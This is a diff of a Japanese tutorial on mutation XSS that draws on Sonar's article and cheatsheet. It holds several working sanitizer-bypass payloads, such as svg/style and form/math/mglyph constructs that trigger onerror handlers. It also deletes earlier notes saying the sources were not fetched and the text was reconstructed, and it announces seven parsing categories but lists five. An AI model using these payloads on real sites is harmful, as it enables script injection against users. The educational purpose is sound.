@@ -1,8 +1,8 @@
 ## mXSS解説とチートシート（Sonar）
 
-このセクションでは、セキュリティ企業 Sonar（旧 SonarSource）が公開した2つの資料 ―― 解説記事「mXSS: The Vulnerability Hiding in Your Code」と、GitHub 上の「SonarSource/mxss-cheatsheet（mXSS チートシート）」―― を軸に、**mXSS（Mutation XSS、変異型クロスサイトスクリプティング）** を体系的に学びます。反射型XSSのような「入力した文字列がそのまま実行される」タイプとは違い、mXSSは「サニタイズ（入力に含まれる危険な文字列を無害な形に変換・除去する処理）を通過した"安全に見える"文字列が、ブラウザによって再解釈される瞬間に危険なコードへ"変異（mutation）"する」という、より一段深い現象を扱います。ここが本セクション最大の学びどころです。
+このセクションでは、セキュリティ企業 Sonar（旧 SonarSource）が公開した2つの資料 ―― 解説記事「mXSS: The Vulnerability Hiding in Your Code」と、GitHub 上の「SonarSource/mxss-cheatsheet（mXSS チートシート）」―― を軸に、**mXSS（Mutation XSS、変異型クロスサイトスクリプティング）** を体系的に学びます。加えて、Sonar が発見した実在の脆弱性である **Joplin（CVE-2023-33726）** と **Mailspring（mXSS→RCE チェーン）** のケーススタディを通じて、mXSS が「アラートを出す遊び」ではなく **OS レベルの侵害に直結しうる脅威** であることを確認します。
 
-> ⚙️ **本セクションの資料取得に関する注記（透明性のため明記）**: 担当した2つの一次資料URL（`sonarsource.com` のブログ記事、および `github.com/SonarSource/mxss-cheatsheet`）は、いずれも本実行環境の**ネットワーク送出プロキシによる遮断**（sonarsource.com / sonarsource.github.io は egress ブロック、GitHub は当セッションのリポジトリ許可ポリシー外のためAPI・raw ともに 403/404）により、**直接取得できませんでした**。そのため本文は、Web検索で得られた各記事のスニペット・二次言及、および同一トピックを扱う権威ある二次資料（Michał Bentkowski / Securitum、Daniel Santos、cure53 DOMPurify Wiki、mXSS 原論文など）と執筆者の専門知識を統合して**復元・再構成**しています。厳密な原文照合が必要な場合は、末尾の各URLをご自身でご確認ください。該当箇所には規定の警告ブロックを挿入してあります。
+反射型XSSのような「入力した文字列がそのまま実行される」タイプとは違い、mXSSは「サニタイズ（入力に含まれる危険な文字列を無害な形に変換・除去する処理）を通過した"安全に見える"文字列が、ブラウザによって再解釈される瞬間に危険なコードへ"変異（mutation）"する」という、より一段深い現象を扱います。ここが本セクション最大の学びどころです。
 
 ---
 
@@ -17,204 +17,259 @@ mXSS の核心は次の一文に集約されます。
 
 つまり mXSS は「フィルタのバグ」ではなく、**"サニタイザが見たDOMツリー" と "ブラウザが最終的に構築したDOMツリー" が食い違う** という、パーサ（構文解析器）の仕様レベルの落とし穴を突きます。ここでいう **DOM（Document Object Model、HTMLをブラウザがツリー構造として保持したもの）** が、同じ入力文字列から2回作られるのに一致しない、という点が本質です。
 
+Sonar の記事が強調する通り、**「マークアップへのいかなる小さな変更も、最終的なDOMツリーに大きな影響を与えうる（Any small change to the markup could have a major impact on the final DOM tree）」**。この事実が mXSS を強力かつ防御困難にしています。
+
 #### 歴史的経緯（なぜ「mutation」と呼ぶのか）
 
 - **2007年**: Yosuke Hasegawa（長谷川陽介）氏が、Internet Explorer で `innerHTML`（要素の中身をHTML文字列として読み書きするプロパティ）を読み戻すと文字列が"勝手に書き換わる"挙動を最初に報告。これが mXSS の原点とされます。
 - **2013年**: Mario Heiderich らの論文 *"mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations"*（ACM CCS 2013）が、この現象を体系化し **mXSS** と名付けました。論文は、当時広く使われていたサーバサイドのサニタイザ（HTML Purifier, kses, htmlLawed, Google Caja 等）、クライアント側フィルタ（旧 IE XSS Filter、Chrome XSS Auditor）、WAF、IDS/IPS のいずれもが mXSS ベクタで回避されうることを示し、大きな衝撃を与えました。
 
 > 出典: mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf
-> 出典: mXSS（The Spanner, Gareth Heyes, 2014） — https://thespanner.co.uk/2014/05/06/mxss
 
 ---
 
-### なぜ mutation が起きるのか ―― パーサ差分（parser differential）
+### Sonar の4分類 ―― mXSS パターンの体系化
 
-Sonar の記事が繰り返し強調する mXSS の根本原因は **パーサ差分（parser differential / parser discrepancy）** です。これは「**同じHTML文字列を、別々のパーサに食わせると、違うDOMツリーが出来上がる**」現象を指します（parser differential ＝ パーサ同士の解釈のズレ）。
+Sonar の記事「mXSS: The Vulnerability Hiding in Your Code」は、mXSS を理解のために **4つのサブカテゴリ** に分割して整理しています。
 
-mXSS が成立する典型的な処理フローは次の通りです。
+#### 1. Parser Differentials（パーサ差分）
 
-1. **サニタイズ段階**: アプリが受け取ったHTMLを、サニタイザ（例: サーバ側のライブラリ）のパーサでツリー化 → 危険な要素・属性を除去 → **文字列にシリアライズ（DOMツリーを再びHTML文字列に書き戻すこと）** して保存・送信する。
-2. **描画段階**: そのHTML文字列を、ブラウザのパーサが**もう一度パース**してDOMを構築し、画面に表示する。
+**サニタイザのパーサとブラウザのパーサの解釈が異なる**ことを突くパターンです。
 
-ここで鍵になるのが、**「シリアライズ → 再パース」というラウンドトリップが冪等（べきとう＝何回やっても同じ結果になる性質）ではない**という事実です。cure53 の DOMPurify Wiki は mXSS をずばり次のように定義しています。
+最も有名な例が `<noscript>` 要素の挙動差です。`<noscript>` の中身がどう解釈されるかは、**JavaScript が有効か無効か（scripting フラグ）** によって変わります。
 
-> serialize（文字列化）してから parse（解析）し直しても、必ずしも元のDOMツリーには戻らない ―― この非対称性こそが mXSS の温床である。
+- サニタイザ内部で使われる `DOMParser` API はスクリプト無効とみなすため、`<noscript>` の中身を **raw text（ただのテキスト）** として扱う。
+- 実ページではスクリプト有効なので、`<noscript>` の中身が **通常のHTMLとして解釈・実行される**。
 
-Sonar 記事の重要な主張は、この差分の"避けられなさ"に関するものです。
+```html
+<noscript><style></noscript><img src=x onerror="alert(1)">
+```
 
-- HTMLのパースは極めて複雑で、しかも配信先のパーサは1つではない（Firefox / Chrome / Safari …とエンジンごとに微妙に挙動が違う）。
-- したがって **「HTMLを解析する場所」と「最終的に描画する場所」が異なる限り、パーサ差分を完全に無くすことは原理的に不可能**である。
-- ゆえに **サーバサイドのサニタイザは構造的に mXSS に弱く**、**描画するのと同じブラウザ上で無害化するクライアントサイド・サニタイザ（DOMPurify など）** の方が、差分を最小化できるぶん安全性が高い。
+サニタイザは `</noscript>` までを `<noscript>` 内のテキストとみなし、`<img onerror>` もそのテキストの一部として無害と判断する。ところが実ページでは `<noscript>` の中身がHTMLとして解釈されるため、`<img onerror>` が本物の要素として出現し発火する。
 
-これが Sonar の防御指針の理論的な背骨になっています（後述の「防御策」で具体化します）。
+#### 2. Parsing Round Trip（パース往復）
+
+**HTMLをシリアライズ（文字列化）し、再びパースすると、異なるDOMツリーが生成される**パターンです。HTML仕様上、シリアライズ→再パースは冪等（べきとう＝何回やっても同じ結果になる性質）ではありません。
+
+代表例はフォームの入れ子です。HTML仕様では `<form>` を入れ子にすることはできません。
+
+```html
+<form id="outer"><div></form><form id="inner"><input>
+```
+
+1回目のパースでは、2つ目の `<form>` は無視され、`<input>` は `outer` のフォームの子になります。しかしこのDOMをシリアライズして再パースすると、`</form>` で `outer` が閉じられた後に `inner` が有効な新しいフォームとして解釈され、**DOM構造が変わります**。
+
+この性質を名前空間混同と組み合わせた高度なペイロードが以下です。
+
+```html
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+```
+
+`<form>` の入れ子不可ルール、MathMLテキスト統合点（`<mtext>`）、`<mglyph>` の名前空間例外、`<style>` の raw text 解釈差を**直列に積み上げて**、サニタイザが見るDOMとブラウザが最終的に構築するDOMの間に最大の差分を作り出します。
+
+#### 3. Desanitization（脱サニタイズ）
+
+**サニタイズ後の処理が、無害化を台無しにする**パターンです。サニタイザ自体は正しく動作しているが、アプリケーションがサニタイズ済みHTMLに対して後から加工（要素の名前変更、属性の付け替え、文字列連結、別ライブラリへの再投入など）を行うことで、注入ベクタが復活します。
+
+たとえば、サニタイズ後に SVG 要素の名前を変更すると、その要素の名前空間コンテキストが変わり、内部の `<style>` の解釈が raw text から通常のマークアップへ切り替わる ―― という形で変異が発生します。
+
+このパターンで脆弱性が発見された実在のアプリケーションには、**osTicket**、**Mailspring**、**ProtonMail**、**Tutanota Desktop**、**Skiff Email** が含まれます。
+
+#### 4. Context-Dependent Parsing（文脈依存パース）
+
+**サニタイザがフラグメント（HTML断片）を解析する文脈と、アプリケーションが最終的にそのHTMLを埋め込む文脈が異なる**パターンです。
+
+たとえばサニタイザは通常の HTML 文脈でフラグメントを解析しますが、アプリケーションがそのサニタイズ済みHTMLを SVG 名前空間の内部に挿入すると、`<style>` の解釈が変わり変異が発生します。ブラウザ間でもフラグメント解析の挙動に差異があり（後述のブラウザ差分を参照）、これも攻撃面を広げます。
 
 > 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
-> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
 
 ---
 
 ### ブラウザ HTMLパーサの再解釈メカニズム（原理編）
 
-mXSS を"暗記"ではなく"理解"するには、**なぜ再パースで構造が変わるのか**をパーサの仕組みで押さえる必要があります。これが本教科書の価値の中心です。以下、mXSS を生む主要な5つのメカニズムを分解します。
+mXSS を"暗記"ではなく"理解"するには、**なぜ再パースで構造が変わるのか**をパーサの仕組みで押さえる必要があります。以下、mXSS を生む主要なメカニズムを分解します。
 
-#### 1. 名前空間（namespace）の切り替え ―― HTML / SVG / MathML
+#### HTML コンテンツの7つのパース分類
 
-HTMLパーサは、DOMツリーの各要素に **名前空間（namespace）** という属性を割り当てます（namespace ＝ その要素がどの言語のルールで解釈されるかを示す"文法モード"）。名前空間は3種類あります。
+HTMLパーサは要素を7つのカテゴリに分類し、それぞれ異なるルールで中身を解釈します。
+
+| カテゴリ | 該当する要素の例 | 中身の扱い |
+|---|---|---|
+| **Void 要素** | `img`, `input`, `br`, `hr`, `meta` | 中身を持てない（自己閉じ） |
+| **Raw text 要素** | `script`, `style`, `iframe` | テキストのみ。エンティティもデコードしない |
+| **Escapable raw text** | `textarea`, `title` | テキストのみだがエンティティはデコードする |
+| **Foreign content** | `svg`, `math` | 別の名前空間のルールで解釈 |
+| **Normal 要素** | `div`, `span`, `p` 等 | 通常のHTMLマークアップとして解釈 |
+
+mXSS の核心は、**同じ要素（典型的には `<style>`）が、所属する名前空間によって上記のどのカテゴリに分類されるかが変わる** ことにあります。
+
+#### 名前空間（namespace）の切り替え ―― HTML / SVG / MathML
+
+HTMLパーサは、DOMツリーの各要素に **名前空間（namespace）** という属性を割り当てます。名前空間は3種類あります。
 
 - **HTML 名前空間**（既定）
-- **SVG 名前空間**
-- **MathML 名前空間**
+- **SVG 名前空間**（`<svg>` 以下）
+- **MathML 名前空間**（`<math>` 以下）
 
-既定では全要素が HTML 名前空間に置かれますが、パーサが `<svg>` に出会うと **SVG 名前空間へ切り替わり**、`<math>` に出会うと **MathML 名前空間へ切り替わります**。そして SVG と MathML の中身は **foreign content（外来コンテンツ＝HTML以外の文法で解釈される領域）** として扱われ、**通常のHTMLとは異なるパースルールが適用されます**。
+SVG と MathML の中身は **foreign content（外来コンテンツ＝HTML以外の文法で解釈される領域）** として扱われ、**通常のHTMLとは異なるパースルールが適用されます**。
 
 この差が最もはっきり出るのが `<style>` 要素の扱いです。
 
-| 文脈 | `<style>` の中身の扱い | 子要素を持てるか | HTMLエンティティのデコード |
-|---|---|---|---|
-| **HTML 名前空間** | raw text（テキストのみ。CSSとしてのみ扱う） | 持てない | されない |
-| **foreign content（SVG/MathML内）** | 通常のHTMLとして解釈しうる | **子要素を持てる** | **デコードされる** |
+| 文脈 | `<style>` の中身の扱い | 子要素を持てるか |
+|---|---|---|
+| **HTML 名前空間** | raw text（テキストのみ） | 持てない |
+| **foreign content（SVG/MathML内）** | 通常のHTMLとして解釈しうる | **子要素を持てる** |
 
-攻撃者はこの差を突きます。**サニタイザが `<style>` の中身を「ただのテキスト」だと信じて素通しした要素が、名前空間が切り替わった再パース時に「本物のHTML要素（＝`<img onerror>` など）」として蘇る** ―― これが名前空間混同（namespace confusion）型 mXSS の骨格です。
+HTML 名前空間では `<style>` 内に書かれた `<img onerror=...>` はただのテキストです。ところが SVG 名前空間内の `<style>` では同じ文字列が**本物のHTML要素**として解釈されます。
 
-> 出典: Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
-
-#### 2. インテグレーションポイント（integration points）と mglyph / malignmark の罠
-
-名前空間はどこでも自由に切り替わるわけではなく、**インテグレーションポイント（integration point、＝外来コンテンツの中に"HTMLの島"を作れる境界要素）** という特別な要素で HTML に戻れます。HTML標準（WHATWG）が定めるものは主に次の通りです。
-
-- **MathML text integration points（MathMLテキスト統合点）**: `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` ―― これらの直下に置かれた要素は HTML 名前空間で解釈される。
-- **HTML integration points（HTML統合点）**:
-  - `<annotation-xml>` で **`encoding` 属性が `text/html` または `application/xhtml+xml`** の場合。
-  - SVG の `<foreignObject>`、`<desc>`、`<title>`。
-
-さらに厄介なのが **`<mglyph>` と `<malignmark>`** です。この2つは、**MathMLテキスト統合点の直下にあるときだけ MathML 名前空間に属する**（他の要素は既定でHTML名前空間になるのに対して例外的な挙動）。攻撃者は「HTML島の中にあるはずなのに、この2要素だけは MathML 側に引き戻される」というこの非対称性を使って、サニタイザの名前空間判定を欺きます。
-
-`<annotation-xml>` の `encoding` の値ひとつで「中身をHTMLとして解釈するか、XML風の外来コンテンツとして解釈するか」が切り替わる点も、サニタイザと実ブラウザで判定がズレやすい古典的な mXSS ポイントです。
-
-> 出典: `<annotation-xml> - MathML`（MDN） — https://developer.mozilla.org/en-US/docs/Web/MathML/Element/annotation-xml
-> 出典: mXSS cheatsheet — Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/
-
-#### 3. raw text 要素 / RCDATA 要素と「scripting フラグ」
-
-HTMLには、中身をタグとして解釈せず**テキストとして丸ごと読み込む特別な要素**があります。挙動により2種類に分かれます。
-
-- **raw text 要素**: `<style>`, `<script>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>`（中身はテキスト。HTMLエンティティのデコードもされない）
-- **RCDATA 要素**: `<textarea>`, `<title>`（中身はテキストだが、HTMLエンティティ `&lt;` などは**デコードされる**）
-
-問題は、これらの「テキストとして扱う範囲」がサニタイザと実ブラウザでズレると、閉じタグの位置がずれ、後続の文字列が"タグの外"に飛び出して実行可能要素になることです。
-
-とりわけ有名なのが **`<noscript>`** の「scripting フラグ依存」挙動です。
-
-- ブラウザの **`DOMParser` API**（文字列からDOMを作る仕組み。サニタイザ内部でよく使われる）で解析すると、**スクリプト無効**とみなされ、`<noscript>` の中身は **raw text（ただのテキスト）** として扱われる。
-- ところが、その結果を実ページに挿入すると、実ページでは**スクリプト有効**なので、`<noscript>` の中身が **再びHTMLとして解釈・実行される**。
-
-この「解析時はスクリプト無効／描画時はスクリプト有効」という文脈差が、`<noscript>` 系 mXSS（Firefox の CVE-2021-23974 が代表例）を生みます。同様に、`<template>` 要素もスクリプト有効/無効で中身のパースが変わる"パース非対称性の地雷"であり、特にサーバサイドでは避けるべき要素です。
-
-> 出典: 1528997 - (CVE-2021-23974) mXSS: Potential XSS via noscript tags parsed by DOMParser APIs（Bugzilla@Mozilla） — https://bugzilla.mozilla.org/show_bug.cgi?id=1528997
-
-#### 4. foster parenting（テーブルの"里子出し"）
-
-`<table>` 系の要素は、HTMLパースの中でも特に癖の強い**独自のパース状態**を持ちます。テーブルの中に置いてはいけない要素（例: `<a>` や `<div>`）が現れると、パーサはそれを**テーブルの直前へ勝手に移動**させます。この現象を **foster parenting（里子出し）** と呼びます。
-
-```
-入力:  <table><a>x</table>
-再構築後: <a>x</a><table></table>   ← <a> がテーブルの外へ"追い出される"
+```html
+<svg><style><a alt="</style><img src=x onerror=alert(1)>">
 ```
 
-攻撃者は、サニタイズ時には「テーブルの中の無害な位置」にあった要素を、再パース時の里子出しによって**別の文脈（例えば `<style>` の外）へ移動させ**、実行可能な位置に運びます。`<table>` を `<mglyph>` や `<svg>` と組み合わせると、**2回目の再パースを経ても変異が持続する**強力なペイロードが作れることが知られています。
+このペイロードでは、SVG 内の `<style>` がもはや raw text 要素ではないため、`</style>` が閉じタグとして機能し、続く `<img onerror>` が実行可能な要素として出現します。
+
+#### インテグレーションポイント（integration points）
+
+名前空間はどこでも自由に切り替わるわけではなく、**インテグレーションポイント（integration point、＝外来コンテンツの中に"HTMLの島"を作れる境界要素）** で HTML に戻れます。
+
+**SVG の HTML integration points:**
+- `<foreignObject>`, `<desc>`, `<title>`
+
+**MathML の HTML integration points（テキスト統合点）:**
+- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>`
+
+**`<annotation-xml>`** は `encoding` 属性が `text/html` または `application/xhtml+xml` の場合にのみ HTML integration point として機能し、SVG を直接の子要素としてのみ埋め込めます。
+
+#### `<mglyph>` と `<malignmark>` の罠
+
+**`<mglyph>` と `<malignmark>`** は特殊な挙動を示します。MathML テキスト統合点（`<mi>`, `<mo>` 等）の**直接の子要素**である場合に限り、MathML 名前空間に留まります。他の要素は既定で HTML 名前空間になるのに対して例外的な挙動です。攻撃者は「HTML島の中にあるはずなのに、この2要素だけは MathML 側に引き戻される」という非対称性を使って、サニタイザの名前空間判定を欺きます。
+
+#### `<image>` 要素の名前空間ブレーカー
+
+SVG 名前空間内で `<image>` 要素が出現すると、ブラウザはこれを `<img>` に変換します。`<img>` は **foreign content breaker（外来コンテンツ脱出要素）** であるため、SVG 名前空間から HTML 名前空間へ強制的に切り替わります。
+
+#### Foreign Content Breakers（外来コンテンツ脱出要素）一覧
+
+以下の要素が foreign content（SVG/MathML）の中に出現すると、パーサは外来コンテンツを終了し HTML 名前空間に戻ります。
+
+> `b`, `big`, `blockquote`, `body`, `br`, `center`, `code`, `dd`, `div`, `dl`, `dt`, `em`, `embed`, `h1`〜`h6`, `head`, `hr`, `i`, `img`, `li`, `listing`, `menu`, `meta`, `nobr`, `ol`, `p`, `pre`, `ruby`, `s`, `small`, `span`, `strong`, `strike`, `sub`, `sup`, `table`, `tt`, `u`, `ul`, `var`
+
+これらの要素を意図的に foreign content 内に配置することで、名前空間の切り替えを制御し、サニタイザの予測と異なるDOMツリーを作り出すのが mXSS の常套手段です。
 
 > 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/
 
-#### 5. HTMLエンティティのデコード差分 と 属性の再解釈
+---
 
-- **エンティティ・デコード差分**: 前述の通り、同じ `<style>` でも名前空間により `&lt;` を `<` に戻すかどうかが変わります。RCDATA 要素（`<textarea>`, `<title>`）でもデコードが起きます。「サニタイザは `&lt;img ...&gt;`（無害なテキスト）と見なしたが、再パースの文脈ではデコードされて `<img ...>`（本物のタグ）になった」という典型パターンを生みます。
-- **属性の再解釈（backtick 等）**: 歴史的には、Hasegawa 氏が発見した「バッククォート `` ` `` を含む属性」の癖が有名です。IE は `alt=\`\`onerror=alert(1)` のようにバッククォートで囲まれた属性値を再シリアライズする際に引用符を落とし、`onerror` が独立した属性として復活してしまいました。属性値のクォート（引用符）の付け外しがサニタイザと実装でズレると、属性境界が壊れて新たなイベントハンドラ属性が生まれます。
+### SonarSource mXSS チートシート ―― 要素ごとの予期しない挙動
 
-> 出典: mXSS Attacks（Heiderich et al., 2013） — https://cure53.de/fp170.pdf
-> 出典: [mXSS] Consider making HTML parsing of `style`, `script`, `xmp` etc consistent between SVG, MathML, HTML（whatwg/html #11397） — https://github.com/whatwg/html/issues/11397
+SonarSource の mXSS チートシート（`sonarsource.github.io/mxss-cheatsheet`）は、「ブラウザのHTMLパース時の癖が引き起こす mutation を深掘りするためのワンストップ資料」として、要素ごとの予期しない挙動を網羅的に整理しています。
+
+#### HTML 名前空間の要素
+
+**Select:**
+`<select>` 内に許可されない要素が出現すると、パーサはその要素を**削除**します。
+
+```
+入力:  <select><a>text</a></select>
+結果:  <select>text</select>     ← <a> が消える
+```
+
+**Form（入れ子不可）:**
+`<form>` は入れ子にできません。ただし `<div>` で分断すると2つ目のフォームが有効になる場合があります。
+
+```
+入力:  <form id="outer"><div></form><form id="inner"><input>
+結果:  （再パース時に inner が有効なフォームとして出現）
+```
+
+**Table（foster parenting／里子出し）:**
+テーブル内に許可されない要素が出現すると、パーサはその要素を**テーブルの直前へ移動**させます。
+
+```
+入力:  <table><a>text</a></table>
+結果:  <a>text</a><table></table>     ← <a> がテーブルの外へ追い出される
+```
+
+**Anchor（入れ子不可）:**
+`<a>` 要素同士は入れ子にできません。Active Formatting Elements の再構築アルゴリズムにより構造が変わります。
+
+**Headings（見出しの入れ子）:**
+見出し要素は入れ子にすると分割されます。
+
+```
+入力:  <h1><h2>text</h2></h1>
+結果:  <h1></h1><h2>text</h2>
+```
+
+**Noscript:**
+前述の通り、JavaScript の有効/無効で中身の解釈が完全に変わります。サニタイザでは最も危険な要素の一つです。
+
+**`<br>` と `<p>`:**
+HTML仕様上、終了タグだけで要素を生成できる唯一の要素群です。
+
+```
+入力:  </p>
+結果:  <p></p>     ← 終了タグだけで要素が生まれる
+```
+
+**Plaintext:**
+`<plaintext>` はHTMLで閉じることができません。一度開くと文書末尾まですべてがテキストとして扱われます。
+
+**Textarea:**
+`<textarea>` の中身はデコードされます（RCDATA要素）。HTMLコメント `<!-- -->` は `<textarea>` 内では解釈されません。
+
+**Active Formatting Elements:**
+以下の要素は「Active Formatting Elements」として特別な再構築アルゴリズムの対象になります。
+
+> `a`, `b`, `big`, `code`, `em`, `font`, `i`, `nobr`, `s`, `small`, `strike`, `strong`, `tt`, `u`
+
+これらの要素が閉じられずに残った場合、パーサは暗黙的にこれらを再適用するため、予期しないDOM構造が生まれます。
+
+**NULL バイト:**
+HTMLパーサは NULL バイト（`\x00`）を **U+FFFD（REPLACEMENT CHARACTER、文字コード 65533）** に変換します。
+
+#### SVG 名前空間の要素
+
+**HTML Integration Points:**
+`<foreignObject>`, `<desc>`, `<title>` の内部では HTML 名前空間に戻り、通常のHTMLとして解釈されます。
+
+**`<image>` 要素:**
+SVG内では `<image>` は許可されていますが、ブラウザは内部でこれを `<img>` に変換します。`<img>` は foreign content breaker であるため、SVG 名前空間から脱出するトリガーになります。
+
+#### MathML 名前空間の要素
+
+**HTML Integration Points（テキスト統合点）:**
+`<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` の内部では HTML 名前空間に戻ります。
+
+**`<annotation-xml>`:**
+SVG を埋め込めるのは**直接の子要素**としてのみです。
+
+**`<mglyph>` / `<malignmark>`:**
+HTML integration point の直接の子要素である場合に限り、MathML 名前空間に留まります（他の要素は HTML 名前空間になるのに対して例外）。
+
+#### ブラウザ間の差異
+
+同じHTMLでもブラウザによってDOMツリーの構築結果が異なるケースがあります。
+
+```
+入力:  <svg><div>text</div></svg>
+```
+
+| ブラウザ | 結果 |
+|---|---|
+| **Firefox** | `<svg><div>text</div></svg>` （`<div>` が SVG 内に留まる） |
+| **Chrome / Safari 等** | `<svg></svg><div>text</div>` （`<div>` が SVG の外へ出る） |
+
+この差異は、あるブラウザでは安全なペイロードが別のブラウザでは実行可能になりうることを意味し、サーバサイドのサニタイザにとって構造的な脅威です。
+
+> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/
+> 出典: mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/
 
 ---
 
-### 一次資料①: Sonar「mXSS: The Vulnerability Hiding in Your Code」
+### 代表的なペイロード集
 
-> ⚠️ **未取得の資料**: 「mXSS: The Vulnerability Hiding in Your Code（Sonar）」は自動取得できませんでした（理由: `sonarsource.com` が本環境のネットワーク送出プロキシで egress ブロックされているため。WebFetch/curl とも接続不可）。以下のURLからユーザーご自身で直接ご覧ください: https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
-
-（以下は取得できなかった資料の補足として、Web検索で得た当記事のスニペット・二次言及と一般的な知識に基づく再構成解説です。）
-
-Sonar のこの記事は、mXSS を「あなたのコードに潜む脆弱性」として、実在のバグ事例を交えて解説する啓発記事です。要点は以下の通りです。
-
-#### mXSS の定義（記事の表現）
-
-> mXSS は、HTMLの"寛容さ"（malformed／壊れたマークアップも受け入れて自動修正する性質）を悪用する。ペイロードはサニタイズ中は無害に見えるが、ブラウザが描画のために再パースした瞬間、悪意あるコードへと変異する。
-
-#### mXSS の4つのサブカテゴリへの分類
-
-記事は「mXSS」という総称を、理解のために **4つのサブカテゴリに分割**して整理しています（検索結果から、分類の存在と観点は確認できましたが、4カテゴリの正式名称の一字一句までは一次原文照合ができていません。観点は概ね次の軸に対応します）。
-
-1. **名前空間の混同（namespace confusion）**: SVG/MathML への切り替えと foreign content による `<style>` 等の解釈変化を突くもの（本セクション原理編の①②）。
-2. **文脈/コンテキストの移動**: 再パース時に要素が text content・属性値・コメントの"外"へ飛び出して実行可能位置に移るもの（③④⑤）。
-3. **raw text / 特殊要素の解釈差**: `<noscript>`・`<template>`・`<textarea>` などスクリプトフラグや文脈でパースが変わる要素を突くもの。
-4. **エンティティ・属性の変異**: デコード差分や属性境界の再構成を突くもの。
-
-> ⚠️ 上記4分類の名称は再構成です。正確な区分は原文をご確認ください（URLは上記警告ブロック参照）。
-
-#### 実在事例（記事の核）
-
-記事の説得力は、Sonar 自身が発見した実在の脆弱性に裏打ちされています。
-
-- **Skiff（プライバシー重視Webメール）**: サニタイズ時に `<style>` が **SVGルールで**パースされ、再パース時に **HTMLルールで**パースされる差を突いて、`<img>` 要素をDOMに挿入し `onerror` を発火させる mXSS。Proton Mail の脆弱性で使ったのとよく似たペイロードで、Skiff のサニタイズ処理を回避できた。Webメールは Electron（ChromiumをデスクトップアプリにするフレームワークでNode.js権限を持つ）で動くことも多く、**サニタイザのパーサとレンダラ（Electron）のパーサの差分**が致命傷になりうる。
-- **Joplin（ノートアプリ、CVE-2023-33726）**: サニタイズ回避（mXSS を含む攻撃チェーン）が最終的に**任意コマンド実行（RCE）**にまで至った。mXSS が単なる「アラートを出す遊び」ではなく、デスクトップアプリでは OS レベルの侵害に直結しうることを示す事例。
-
-#### 記事の結論・防御の推奨
-
-- **クライアントサイドのサニタイザ（DOMPurify 等）を使うこと。** 描画するのと同じブラウザ上で無害化すればパーサ差分のリスクを避けられる。逆にサーバサイドのサニタイザは、配信先ブラウザの多様さゆえに差分を排除できず**構造的に失敗しやすい**。
-- **サニタイズ後にHTMLを再加工・再パースしないこと（desanitization の回避）。** サニタイズ済みの文字列にアプリが後から手を加える（文字列連結・再パース・別ライブラリ通過など）と、無害化が台無しになり注入ベクタが復活しうる。
-- 目的は「開発者と研究者が、この問題に自信を持って対処できるように武装させること」だと記事は締めくくっている。
-
-> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
-> 出典: Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk
-> 出典（二次言及）: mXSS: The Vulnerability Hiding in Your Code（Security Boulevard 転載） — https://securityboulevard.com/2024/05/mxss-the-vulnerability-hiding-in-your-code/
-
----
-
-### 一次資料②: SonarSource mXSS チートシート
-
-> ⚠️ **未取得の資料**: 「SonarSource mXSS チートシート（github.com/SonarSource/mxss-cheatsheet）」は自動取得できませんでした（理由: 当セッションの GitHub アクセスは許可リポジトリのみに制限されており、当リポジトリは対象外のため API・raw・blob いずれも 403/404。ミラーの `sonarsource.github.io` も egress ブロック）。以下のURLからユーザーご自身で直接ご覧ください: https://github.com/SonarSource/mxss-cheatsheet （ミラー: https://sonarsource.github.io/mxss-cheatsheet/ ）
-
-（以下は取得できなかった資料の補足として、Web検索で得たリポジトリ説明・各ページのスニペットと一般的な知識に基づく再構成解説です。）
-
-#### チートシートの位置づけと構成
-
-リポジトリ説明文（検索で取得）は次の通りです。
-
-> "This repository is a one-stop shop for diving deep into the fascinating world of mXSS (mutations caused by browser quirks in HTML parsing), providing a curated list of examples that showcase unexpected HTML behaviors."
-> （＝ブラウザのHTMLパース時の癖が引き起こす mutation を深掘りするためのワンストップ資料。予期しないHTML挙動の実例を厳選して収録。）
-
-主なファイル/ページ構成:
-
-- **`explained.md`（mXSS Explained）**: 理論編。mXSS の定義と、なぜ mutation が起きるかを分類とともに解説。
-- **`examples.md`（Payload examples）**: 実践編。過去にサニタイザ回避に使われた**新規ベクタ/新技法を含むペイロードだけを厳選**して収録（既知の焼き直しは除外）。
-- **`tools`**: mXSS を試す/確認するためのツール類（`livedom.lab.xss.academy` のような、入力HTMLがブラウザでどう再解釈されるかを可視化する DOM ビューワなど）。
-- GitHub Pages 版（`sonarsource.github.io/mxss-cheatsheet/`）で読みやすく公開。
-
-#### チートシートが採る分類（parser 再解釈の分類）
-
-`explained.md` は mXSS を「パーサの再解釈がどこで起きるか」で整理しています（検索スニペットから復元）。
-
-1. **Parser Discrepancies（パーサの不一致）**: そもそもの根本原因。サニタイザのパースアルゴリズムと、レンダラ（ブラウザ）のパースアルゴリズムのミスマッチ。
-2. **Namespace and Context Issues（名前空間と文脈の問題）**: サニタイズ時はある名前空間で安全に見えた要素が、ブラウザの2回目のパースで別の名前空間へ移り、text content・属性値・コメントの"外"へ飛び出して変異する。
-3. **Raw Text Elements（raw text 要素）**: `<noscript>` のようにスクリプト有効/無効で解釈が変わる要素。本文の解釈規則が文脈依存で変化する。
-
